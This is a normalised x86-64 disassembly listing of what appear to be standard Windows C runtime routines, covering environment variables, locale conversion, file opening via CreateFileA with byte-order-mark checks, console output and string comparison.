mov rax [ rbp ]
test rax rax
je r-xdata
lea ecx [ rax + 0x9 ]
call sub_14003e1c4
test r15d r15d
jne r-xdata
cmp [ rbp ] r13
je r-xdata
add rdi 0x8
mov rcx [ rdi ]
test rcx rcx
jne r-xdata
mov rax [ rdi ]
cmp [ r13 + rax ] 0x3d
je r-xdata
mov [ rax ] r13
cmp [ rw-data ] r13
jne r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rsi [ rw-data ]
mov [ rdi ] r13
mov rdi [ rsp + 0x70 ]
sub rbp rdi
mov rcx r12
call sub_14003ad04
mov [ r14 ] r13
jmp r-xdata
test edi edi
jns r-xdata
movsxd rsi edi
mov rcx [ rbp + rsi * 8 ]
call sub_14003ad04
test r15d r15d
je r-xdata
mov rsi [ rw-data ]
mov rsi [ rw-data ]
sub rdi rsi
sar rdi 0x3
jmp r-xdata
cmp [ r13 + rax ] bl
je r-xdata
mov ecx 0x8
call sub_140041684
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rcx rax
call sub_140055604
mov [ rdi ] rax
add rdi 0x8
mov rax [ rdi + rbp ]
test rax rax
jne r-xdata
lea eax [ rdi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
mov [ rbp + rsi * 8 ] r12
mov [ r14 ] r13
jmp r-xdata
cmp [ rbp + rsi * 8 ] r13
je r-xdata
xor r13d r13d
test edi edi
js r-xdata
mov [ rax ] r13
movsxd r8 eax
mov rax 0x1fffffffffffffff
cmp r8 rax
jae r-xdata
cmp [ rsp + 0x78 ] r13d
je r-xdata
movsxd rdx edi
mov rax 0x1fffffffffffffff
cmp rdx rax
jae r-xdata
lea rcx [ rbp + rsi * 8 + 0x8 ]
mov edx 0x8
mov rcx rsi
call sub_140041810
test rax rax
je r-xdata
test r15d r15d
je r-xdata
mov rcx r12
call sub_14003f7f0
mov edx 0x1
lea rcx [ rax + 0x2 ]
call sub_140041704
mov rdi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
mov r8d 0x8
call sub_140041810
test rax rax
je r-xdata
mov rax [ rcx ]
inc edi
add rcx 0x8
mov [ rbp + rsi * 8 ] rax
inc rsi
cmp [ rbp + rsi * 8 ] r13
jne r-xdata
movsxd rcx edi
mov [ rax + rcx * 8 ] r12
mov [ rax + rcx * 8 + 0x8 ] r13
mov [ r14 ] r13
mov eax ebx
jmp r-xdata
mov rcx r12
call sub_14003ad04
mov [ r14 ] r13
mov rcx r12
call sub_14003f7f0
mov r8 r12
mov rcx rdi
lea rdx [ rax + 0x2 ]
call sub_140042dcc
test eax eax
jne r-xdata
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_1400436bc
int3
mov rdx rdi
mov rcx rdi
sub rdx r12
add rdx [ rsp + 0x70 ]
mov [ rdx ] r13b
inc rdx
test r15d r15d
cmovne rdx r13
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] rax
mov rcx rdi
call sub_14003ad04
or ebx 0xffffffff
call sub_14003f1a4
mov [ rax ] 0x2a
sub_1400527a0
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov rax [ rcx ]
mov r13d r8d
mov r14d edx
mov r12d [ rax + 0x4 ]
mov r15 r9
xor r8d r8d
xor r9d r9d
mov edx r13d
mov ecx r14d
xor edi edi
call [ GetLocaleInfoW@IAT ]
movsxd rsi eax
test eax eax
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_14003a6a0
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d esi
mov r8 rbx
mov edx r13d
mov ecx r14d
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x60 ]
or r9d 0xffffffff
xor edx edx
mov [ rsp + 0x38 ] rdi
mov r8 rbx
mov ecx r12d
mov [ rsp + 0x30 ] rdi
test eax eax
jne r-xdata
call sub_14003ae78
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_14003ad04
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r15
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_14003d700
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
call [ WideCharToMultiByte@IAT ]
mov edi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_1400528f8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x30 ]
mov rbx r9
mov edi r8d
call sub_14003b928
mov r11d [ rsp + 0x80 ]
lea rcx [ rsp + 0x30 ]
mov r9 rbx
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] r11d
call sub_1400527a0
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_140052960
mov [ rsp + 0x8 ] cx
sub rsp 0x38
mov rcx [ rw-data ]
cmp rcx 0xfffffffffffffffe
jne r-xdata
cmp rcx 0xffffffffffffffff
jne r-xdata
call sub_140055768
mov rcx [ rw-data ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x48 ]
lea rdx [ rsp + 0x40 ]
mov r8d 0x1
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
jmp r-xdata
movzx eax [ rsp + 0x40 ]
add rsp 0x38
retn
sub_1400529bc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x80
xor edi edi
mov r13b 0x80
mov esi r9d
mov rbx rdx
mov [ rbp - 0x18 ] 0x18
lea r12d [ rdi + 0x1 ]
mov [ rbp - 0x28 ] edi
mov [ rbp + 0x58 ] dil
mov [ rbp - 0x10 ] rdi
test r13b r9b
je r-xdata
mov [ rbp - 0x8 ] r12d
mov r15b dil
mov [ rbp - 0x8 ] edi
mov r15b 0x10
jmp r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rdi
call sub_1400436bc
int3
mov eax 0x8000
test eax esi
jne r-xdata
lea rcx [ rbp - 0x28 ]
call sub_14003bf58
test eax eax
jne r-xdata
mov ecx esi
mov r9d 0x3
mov eax 0xc0000000
and ecx r9d
mov r8d 0x80000000
je r-xdata
test esi 0x74000
jne r-xdata
mov r14d r8d
dec ecx
je r-xdata
or r15b r13b
cmp [ rbp - 0x28 ] eax
je r-xdata
mov edx edi
sub ecx 0x10
je r-xdata
test sil 0x8
je r-xdata
dec ecx
je r-xdata
mov r12d r9d
cmp eax r8d
je r-xdata
mov edx r12d
jmp r-xdata
sub ecx 0x10
je r-xdata
mov r14d 0x40000000
jmp r-xdata
test esi 0x70000
jne r-xdata
mov r14d eax
jmp r-xdata
call sub_14003f1c4
mov [ rax ] edi
or [ rbx ] 0xffffffff
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
call sub_140043760
mov eax ebx
test sil 0x40
je r-xdata
mov al [ rw-data ]
not al
and al [ rbp + 0x68 ]
test al 0x80
lea eax [ rcx - 0x7f ]
cmove ecx eax
mov [ rbp - 0x30 ] ecx
mov r12d 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
mov eax esi
mov ecx 0x700
mov [ rbp - 0x38 ] edx
and eax ecx
mov r8d 0x100
je r-xdata
mov edx r13d
jmp r-xdata
sub ecx 0x10
je r-xdata
mov ecx [ rbp + 0x60 ]
mov [ rbp - 0x3c ] r14d
mov r13d 0x2
sub ecx 0x10
je r-xdata
bt esi 0xc
jae r-xdata
bts ecx 0x1a
bts r14d 0x10
or edx 0x4
mov [ rbp - 0x38 ] edx
mov [ rbp - 0x30 ] ecx
mov [ rbp - 0x3c ] r14d
mov ecx 0x80
mov [ rbp - 0x30 ] ecx
test r8d esi
je r-xdata
mov r12d 0x5
jmp r-xdata
cmp eax 0x300
je r-xdata
mov edx r9d
jmp r-xdata
cmp ecx 0x40
jne r-xdata
test sil 0x20
je r-xdata
or ecx r8d
mov [ rbp - 0x30 ] ecx
mov r12d r13d
jmp r-xdata
cmp eax 0x400
je r-xdata
cmp r14d r8d
mov edx edi
sete dl
jmp r-xdata
test sil 0x10
je r-xdata
bts ecx 0x1b
jmp r-xdata
cmp eax 0x500
je r-xdata
call sub_140046f2c
mov [ rbx ] eax
cmp eax 0xffffffff
jne r-xdata
bts ecx 0x1c
mov [ rbp - 0x30 ] ecx
cmp eax 0x600
je r-xdata
mov rax [ rbp + 0x40 ]
mov r8d [ rbp - 0x38 ]
mov rcx [ rbp + 0x50 ]
mov [ rax ] 0x1
mov eax [ rbp - 0x30 ]
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] eax
lea r9 [ rbp - 0x18 ]
mov edx r14d
mov [ rsp + 0x20 ] r12d
call [ CreateFileA@IAT ]
mov [ rbp - 0x20 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
call sub_14003f1c4
mov [ rax ] edi
or [ rbx ] 0xffffffff
call sub_14003f1a4
mov [ rax ] 0x18
call sub_14003f1a4
mov eax [ rax ]
jmp r-xdata
cmp eax ecx
je r-xdata
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx 0xc0000000
mov eax r14d
and eax ecx
cmp eax ecx
jne r-xdata
mov rbx [ rsp + 0xc8 ]
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
jmp r-xdata
cmp eax r13d
jne r-xdata
movsxd rcx [ rbx ]
lea r14 [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
call [ GetLastError@IAT ]
mov ecx eax
mov ebx eax
call sub_14003f1e4
mov rcx [ rbp - 0x20 ]
call [ CloseHandle@IAT ]
test ebx ebx
jne r-xdata
movsxd rcx [ rbx ]
lea r14 [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
call [ GetLastError@IAT ]
mov ecx eax
call sub_14003f1e4
mov eax 0x1
test al sil
je r-xdata
cmp eax 0x3
jne r-xdata
or r15b 0x40
jmp r-xdata
call sub_14003f1a4
mov edi [ rax ]
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0xd
jmp r-xdata
mov eax edi
jmp r-xdata
mov eax [ rbp - 0x30 ]
mov r8d [ rbp - 0x38 ]
mov rcx [ rbp + 0x50 ]
btr r14d 0x1f
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] eax
lea r9 [ rbp - 0x18 ]
mov edx r14d
mov [ rsp + 0x20 ] r12d
mov [ rbp - 0x3c ] r14d
call [ CreateFileA@IAT ]
mov [ rbp - 0x20 ] rax
cmp rax 0xffffffffffffffff
jne r-xdata
mov rdx [ rbp - 0x20 ]
mov ecx [ rbx ]
call sub_140046c8c
movsxd rcx [ rbx ]
lea r14 [ rw-data ]
mov rax rcx
and ecx 0x1f
mov r8d 0x1
sar rax 0x5
or r15b r8b
mov rax [ r14 + rax * 8 ]
imul rcx rcx 0x58
mov [ rax + rcx + 0x8 ] r15b
movsxd rcx [ rbx ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + rcx + 0x38 ] 0x80
mov al r15b
and al 0x48
mov [ rbp - 0x2c ] al
jne r-xdata
or r15b 0x8
test r15b r15b
jns r-xdata
test r15b r15b
jns r-xdata
mov r15d [ rbp - 0x3c ]
mov edx 0x74000
mov ecx 0x4000
test edx esi
jne r-xdata
test r13b sil
je r-xdata
mov ecx 0xc0000000
mov eax r15d
and eax ecx
cmp eax ecx
jne r-xdata
test sil 0x8
je r-xdata
mov eax esi
and eax edx
cmp eax ecx
je r-xdata
mov eax [ rbp - 0x28 ]
and eax edx
jne r-xdata
mov ecx [ rbx ]
mov r8d r13d
or edx 0xffffffff
call sub_140044a78
mov [ rbp - 0x34 ] eax
cmp eax 0xffffffff
jne r-xdata
test r8b sil
je r-xdata
movsxd rcx [ rbx ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
or [ rax + rcx + 0x8 ] 0x20
mov [ rbp + 0x58 ] dil
cmp eax 0x10000
je r-xdata
or esi eax
or esi ecx
jmp r-xdata
mov ecx [ rbx ]
lea rdx [ rbp - 0x40 ]
mov r8d 0x1
mov [ rbp - 0x40 ] dil
call sub_140043f64
test eax eax
jne r-xdata
call sub_14003f1c4
cmp [ rax ] 0x83
je r-xdata
mov rcx [ rbp - 0x20 ]
call [ CloseHandle@IAT ]
mov eax [ rbp - 0x30 ]
mov r8d [ rbp - 0x38 ]
mov rcx [ rbp + 0x50 ]
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] eax
btr r15d 0x1f
lea r9 [ rbp - 0x18 ]
mov [ rsp + 0x20 ] 0x3
mov edx r15d
call [ CreateFileA@IAT ]
cmp rax 0xffffffffffffffff
jne r-xdata
test r15b 0x40
mov r15d [ rbp - 0x3c ]
mov [ rbp - 0x34 ] edi
jne r-xdata
mov ecx 0x301
mov eax esi
and eax ecx
cmp eax ecx
jne r-xdata
cmp eax 0x14000
je r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_140044a78
cmp eax 0xffffffff
je r-xdata
cmp [ rbp - 0x40 ] 0x1a
jne r-xdata
mov r8d 0x1
mov ecx [ rbx ]
call sub_140044bf0
jmp r-xdata
movsxd rdx [ rbx ]
mov rcx rdx
and edx 0x1f
sar rcx 0x5
imul rdx rdx 0x58
mov rcx [ r14 + rcx * 8 ]
mov [ rdx + rcx ] rax
call [ GetLastError@IAT ]
mov ecx eax
call sub_14003f1e4
movsxd r11 [ rbx ]
mov rax r11
and r11d 0x1f
sar rax 0x5
imul r11 r11 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + r11 + 0x8 ] 0xfe
mov ecx [ rbx ]
call sub_140046d3c
jmp r-xdata
mov r8d 0x1
mov eax r15d
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test esi 0x70000
je r-xdata
mov [ rbp + 0x58 ] r13b
jmp r-xdata
cmp eax 0x20000
je r-xdata
movsxd rdx [ rbp - 0x34 ]
mov ecx [ rbx ]
call sub_1400549c0
cmp eax 0xffffffff
je r-xdata
test r12d r12d
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp r12d r13d
jbe r-xdata
mov ecx [ rbx ]
lea rdx [ rbp - 0x34 ]
mov r8d 0x3
call sub_140043f64
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx ecx [ rbp + 0x58 ]
mov r12d edi
dec ecx
je r-xdata
cmp r12d 0x4
ja r-xdata
cmp eax r13d
je r-xdata
test r12d r12d
je r-xdata
mov [ rbp + 0x58 ] r8b
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ rbp - 0x34 ] 0xbfbbef
mov r13d 0x3
dec ecx
jne r-xdata
cmp r12d 0x5
jne r-xdata
mov ecx [ rbx ]
mov r8d r13d
xor edx edx
call sub_140050450
test rax rax
je r-xdata
movzx eax [ rbp - 0x34 ]
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp r12d r13d
jbe r-xdata
add r12d eax
cmp r13d r12d
jg r-xdata
mov [ rbp - 0x34 ] 0xfeff
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_140050450
cmp rax 0xffffffffffffffff
cmp eax 0xfeff
jne r-xdata
mov ecx [ rbx ]
call sub_140044bf0
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
mov edi ebx
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_140044a78
cmp eax 0xffffffff
jmp r-xdata
cmp [ rbp - 0x34 ] 0xbfbbef
jne r-xdata
cmp r12d 0x4
jbe r-xdata
mov ecx [ rbx ]
movsxd rax r12d
mov r8d r13d
lea rdx [ rbp + rax - 0x34 ]
sub r8d r12d
call sub_14004f254
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ rbx ]
xor r8d r8d
mov edx r13d
call sub_140044a78
cmp eax 0xffffffff
je r-xdata
jne r-xdata
lea r8d [ rax - 0x2 ]
mov [ rbp + 0x58 ] r8b
jmp r-xdata
mov ecx [ rbx ]
mov r8d r13d
xor edx edx
call sub_140050450
test rax rax
je r-xdata
mov [ rbp + 0x58 ] r13b
jmp r-xdata
movsxd rcx [ rbx ]
mov r12b [ rbp + 0x58 ]
mov rax rcx
and ecx 0x1f
and r12b 0x7f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ r14 + rax * 8 ]
and [ rax + rcx + 0x38 ] 0x80
or [ rax + rcx + 0x38 ] r12b
movsxd rdx [ rbx ]
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
mov rcx [ r14 + rax * 8 ]
mov eax esi
and [ rcx + rdx + 0x38 ] 0x7f
shr eax 0x10
shl al 0x7
or [ rcx + rdx + 0x38 ] al
cmp [ rbp - 0x2c ] dil
jne r-xdata
mov ecx [ rbx ]
xor r8d r8d
xor edx edx
call sub_140050450
cmp rax 0xffffffffffffffff
je r-xdata
sub_140053164
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x40
and [ rsp + 0x30 ] 0x0
xor eax eax
mov rdi [ rsp + 0x70 ]
test rdi rdi
setne al
test eax eax
jne r-xdata
or [ rdi ] 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
je r-xdata
call sub_14003f1a4
mov ebx 0x16
mov [ rax ] ebx
call sub_140043760
cmp [ rsp + 0x78 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
mov [ rsp + 0x28 ] r9d
mov [ rsp + 0x20 ] r8d
mov r9d edx
mov r8 rcx
mov rdx rdi
lea rcx [ rsp + 0x30 ]
call sub_1400529bc
mov ebx eax
mov [ rsp + 0x34 ] eax
cmp [ rsp + 0x30 ] 0x0
je r-xdata
test r9d 0xfffffe7f
mov eax 0x0
sete al
test eax eax
je r-xdata
test ebx ebx
je r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
or [ rdi ] 0xffffffff
jmp r-xdata
mov ecx [ rdi ]
call sub_140046f04
movsxd rcx [ rdi ]
mov rax rcx
sar rax 0x5
lea rdx [ rw-data ]
and ecx 0x1f
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
and [ rax + rcx + 0x8 ] 0xfe
sub_140053238
sub rsp 0x38
mov eax r9d
mov r9d [ rsp + 0x60 ]
mov r10d r8d
mov r11 rdx
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] rcx
mov r8d eax
mov edx r10d
mov rcx r11
call sub_140053164
add rsp 0x38
retn
sub_14005326c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x40
mov rdi rcx
mov rsi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r9
mov rbx r8
call sub_14003b928
xor r12d r12d
test rbx rbx
jne r-xdata
mov rcx [ rbp - 0x18 ]
cmp [ rcx + 0x8 ] r12d
jne r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
test rdi rdi
jne r-xdata
mov r8 rbx
mov rdx rsi
mov rcx rdi
call sub_14005185c
jmp r-xdata
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
test rsi rsi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rbp - 0x8 ] r12b
je r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
add rsp 0x40
pop rbp
retn
mov r9b 0x4
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx eax dx
test [ rax + rcx + 0x1d ] 0x10
je r-xdata
test rbx rbx
jne r-xdata
movzx r8d [ rsi ]
inc rsi
mov eax r8d
test [ r8 + rcx + 0x1d ] r9b
je r-xdata
movzx edx [ rax + rcx + 0x11d ]
cmp [ rdi ] r12b
jne r-xdata
movzx eax [ rsi ]
movzx edx r12w
test [ rax + rcx + 0x1d ] r9b
jne r-xdata
movzx eax r8w
test [ rax + rcx + 0x1d ] 0x10
je r-xdata
test rbx rbx
jne r-xdata
movzx eax [ rdi ]
shl dx 0x8
inc rdi
or dx ax
cmp dx [ rcx + 0x10 ]
jb r-xdata
mov edx r12d
jmp r-xdata
jmp r-xdata
movzx eax r8w
movzx eax [ rax + rcx + 0x11d ]
jmp r-xdata
dec rbx
cmp [ rsi ] r12b
jne r-xdata
mov eax r12d
jmp r-xdata
cmp dx [ rcx + 0x16 ]
jb r-xdata
cmp dx [ rcx + 0x12 ]
ja r-xdata
cmp ax dx
jne r-xdata
sbb eax eax
and eax 0x2
dec eax
test dx dx
je r-xdata
movzx eax [ rsi ]
shl r8w 0x8
inc rsi
or r8w ax
movzx eax r8w
cmp r8w [ rcx + 0x10 ]
jb r-xdata
movzx eax r12w
jmp r-xdata
cmp dx [ rcx + 0x18 ]
ja r-xdata
add dx [ rcx + 0x14 ]
jmp r-xdata
test rbx rbx
jne r-xdata
cmp ax [ rcx + 0x16 ]
jb r-xdata
cmp ax [ rcx + 0x12 ]
ja r-xdata
add dx [ rcx + 0x1a ]
jmp r-xdata
movzx edx [ rdi ]
dec rbx
inc rdi
test [ rdx + rcx + 0x1d ] r9b
je r-xdata
jmp r-xdata
cmp ax [ rcx + 0x18 ]
ja r-xdata
add ax [ rcx + 0x14 ]
jmp r-xdata
add ax [ rcx + 0x1a ]
jmp r-xdata
sub_14005345c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x40
xor r12d r12d
mov rbx r8
mov rsi rdx
mov rdi rcx
test r8 r8
jne r-xdata
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_14003b928
mov r11 [ rbp - 0x18 ]
cmp [ r11 + 0x8 ] r12d
jne r-xdata
xor eax eax
jmp r-xdata
test rdi rdi
jne r-xdata
mov r8 rbx
mov rdx rsi
mov rcx rdi
call sub_140049720
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
add rsp 0x40
pop rbp
retn
test rsi rsi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rbp - 0x8 ] r12b
je r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
mov r8b 0x4
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx edx [ rsi ]
inc rsi
test [ rdx + r11 + 0x1d ] r8b
je r-xdata
test rbx rbx
jne r-xdata
cmp dx cx
jne r-xdata
test rbx rbx
jne r-xdata
cmp [ rdi ] r12b
jne r-xdata
movzx eax [ rsi ]
mov ecx r12d
test [ rax + r11 + 0x1d ] r8b
jne r-xdata
sbb eax eax
and eax 0x2
dec eax
test cx cx
je r-xdata
dec rbx
cmp [ rsi ] r12b
jne r-xdata
mov edx r12d
jmp r-xdata
movzx eax [ rdi ]
shl cx 0x8
or cx ax
inc rdi
movzx ecx r12w
jmp r-xdata
cmp [ rbp - 0x8 ] r12b
je r-xdata
movzx edx ax
jmp r-xdata
test rbx rbx
jne r-xdata
movzx eax [ rsi ]
shl dx 0x8
or dx ax
inc rsi
movzx edx r12w
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
movzx ecx [ rdi ]
dec rbx
inc rdi
test [ rcx + r11 + 0x1d ] r8b
je r-xdata
sub_1400535c4
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x10 ] rax
movzx eax [ rcx + 0xa ]
xor ebx ebx
mov r15d 0x1f
mov edi eax
and eax 0x8000
mov [ rbp - 0x38 ] rdx
mov [ rbp - 0x3c ] eax
mov eax [ rcx + 0x6 ]
and edi 0x7fff
mov [ rbp - 0x30 ] eax
mov eax [ rcx + 0x2 ]
sub edi 0x3fff
mov [ rbp - 0x2c ] eax
movzx eax [ rcx ]
lea esi [ rbx + 0x1 ]
shl eax 0x10
lea r12d [ r15 - 0x1c ]
mov [ rbp - 0x28 ] eax
cmp edi 0xffffc001
jne r-xdata
mov r9d [ rw-data ]
lea rcx [ rbp - 0x30 ]
mov r11d r15d
mov rax [ rcx ]
or r14d 0xffffffff
mov [ rbp - 0x40 ] edi
mov [ rbp - 0x20 ] rax
mov eax [ rcx + 0x8 ]
mov r13d ebx
mov [ rbp - 0x18 ] eax
mov eax r9d
cdq
and edx r15d
add eax edx
mov r10d eax
and eax r15d
sub eax edx
sar r10d 0x5
sub r11d eax
movsxd rax r10d
mov ecx [ rbp + rax * 4 - 0x30 ]
bt ecx r11d
jae r-xdata
mov r8d ebx
mov eax ebx
mov ecx r11d
mov eax r14d
shl eax cl
movsxd rcx r10d
and [ rbp + rcx * 4 - 0x30 ] eax
lea eax [ r10 + 0x1 ]
movsxd rdx eax
cmp rdx r12
jge r-xdata
mov ecx r11d
mov eax r14d
movsxd r8 r10d
shl eax cl
not eax
test [ rbp + r8 * 4 - 0x30 ] eax
jne r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov ebx 0x2
jmp r-xdata
add rax rsi
cmp rax r12
jl r-xdata
test r13d r13d
je r-xdata
lea rcx [ rbp + rdx * 4 - 0x30 ]
mov r8 r12
sub r8 rdx
xor edx edx
shl r8 0x2
call sub_14003d760
lea eax [ r9 - 0x1 ]
mov ecx r15d
cdq
and edx r15d
add eax edx
mov r8d eax
and eax r15d
sub eax edx
sar r8d 0x5
mov edx esi
sub ecx eax
movsxd r9 r8d
mov eax [ rbp + r9 * 4 - 0x30 ]
shl edx cl
lea ecx [ rax + rdx ]
cmp ecx eax
jb r-xdata
lea eax [ rsi + r8 ]
cdqe
jmp r-xdata
sub r15d [ rw-data ]
mov cl r15b
shl r8d cl
neg [ rbp - 0x3c ]
sbb eax eax
and eax 0x80000000
or r8d eax
mov eax [ rw-data ]
or r8d [ rbp - 0x30 ]
cmp eax 0x40
jne r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov eax edx
sub eax [ rw-data ]
cmp edi eax
jge r-xdata
add edi esi
mov r13d esi
cmp ecx edx
jae r-xdata
cmp rax r12
jl r-xdata
cmp eax 0x20
jne r-xdata
mov eax [ rbp - 0x2c ]
mov [ rdx + 0x4 ] r8d
mov [ rdx ] eax
jmp r-xdata
cmp edi edx
jg r-xdata
mov [ rbp - 0x30 ] rbx
mov [ rbp - 0x28 ] ebx
mov r8d ebx
mov ebx 0x2
jmp r-xdata
test r13d r13d
je r-xdata
sub r8d esi
mov [ rbp + r9 * 4 - 0x30 ] ecx
movsxd rdx r8d
js r-xdata
cmp [ rbp + rax * 4 - 0x30 ] ebx
jne r-xdata
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rdx ] r8d
mov eax [ rw-data ]
cdq
and edx r15d
add eax edx
cmp edi [ rw-data ]
jl r-xdata
sub edx [ rbp - 0x40 ]
